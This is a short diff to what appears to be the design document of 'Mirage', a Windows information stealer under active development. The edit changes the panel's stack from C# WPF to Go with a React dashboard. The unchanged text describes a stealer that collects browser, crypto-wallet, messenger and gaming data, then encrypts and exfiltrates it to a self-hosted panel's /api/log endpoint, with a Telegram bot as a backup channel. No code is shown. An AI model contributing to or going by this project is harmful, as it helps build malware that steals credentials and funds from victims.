@@ -7,7 +7,7 @@ Mirage is a two-component Windows x64 information stealer:
 | Component | Language | Target | Role |
 |-----------|----------|--------|------|
 | **Mirage.Stealer** | Zig 0.16 + inline ASM | x86_64-windows, ReleaseSmall | Collects browser/wallet/messenger/gaming data, ZIPs, encrypts, exfiltrates |
-| **Mirage.Panel** | C# .NET 10 WPF | AnyCPU | Self-hosted ASP.NET Core server + Material Design dashboard + PE builder |
+| **Mirage.Panel** | Go + React (TypeScript) | Linux/macOS/Windows | Self-hosted Go server + React SPA dashboard + PE builder |
 
 The stealer sends encrypted ZIP archives via HTTPS to the Panel's `/api/log` endpoint, with a Telegram Bot API backup channel.
 
